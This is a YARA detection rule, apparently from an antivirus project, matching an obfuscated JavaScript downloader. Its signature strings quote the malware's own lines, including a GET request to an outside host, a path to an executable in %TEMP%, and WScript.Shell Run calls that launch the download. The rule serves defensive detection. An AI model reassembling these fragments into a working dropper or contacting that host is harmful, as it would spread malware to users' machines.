rule sig_20160329_d45032e19bb4873303397b431aee80c1 {
  meta:
    description = "datamaliciousorder - file 20160329_d45032e19bb4873303397b431aee80c1.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "b2eede7fdc43bc1192c15e15213a1d56a4173aebd2181cf04bfd6c9db5f0a963"

  strings:
    $s1  = "function Fzhqdwi() {return Wejcpee[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"57mZlXNi6OaMKN.exe\";};" fullword ascii
    $s2  = "do {WScript[Zpdzsbt](Nbutdthzp() * 11)} while (Exhemh[\"readystate\"] < 4 );" fullword ascii
    $s3  = "function Wbnjgs(Bufsycd, Rvfilsqz){return Bufsycd - Rvfilsqz;};" fullword ascii
    $s4  = "var Wejcpee = function Hyhaqxqv() {return WScript[Hycicntww](\"WScript.Shell\");}();" fullword ascii
    $s5  = "Exhemh[Puhtu](\"GET\", \"http://chibitesafaris.co.tz/ke7sif\", false);" fullword ascii
    $s6  = "function Jyjiqobaik() {return ((Htfeqhqsm == true) && (Htfeqhqsm == Iotjl)) ? 1 : Xghzlz;};" fullword ascii
    $s7  = "function Hndmrvxaps(Vurcsajt){Wejcpee[\"Run\"](Vurcsajt, Xghzlz, Xghzlz);};" fullword ascii
    $s8  = "function Vvslbgmco(Itrxpbdxjr) {var Fyqrhacv = (1, 2, 3, 4, 5, Itrxpbdxjr); return Fyqrhacv;};" fullword ascii
    $s9  = "var Thgwqdsra = false;" fullword ascii
    $s10 = "function Ncobwe()" fullword ascii
    $s11 = "var Irhgvgq = new this[\"Date\"]();" fullword ascii
    $s12 = "function Rasrxvai(){return Hycicntww;};" fullword ascii
    $s13 = "Htfeqhqsm = true; " fullword ascii
    $s14 = "function Nbutdthzp(){return 22;};" fullword ascii
    $s15 = "var Htfeqhqsm = false;" fullword ascii
    $s16 = " while (Zsvgyxbxar){" fullword ascii
    $s17 = "return Wbnjgs(Hvrhyj, Oificgktme);" fullword ascii
    $s18 = "var Iotjl = false;" fullword ascii
    $s19 = "function Ocmikxl(){return Qjinkpy;};" fullword ascii
    $s20 = "Iotjl = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}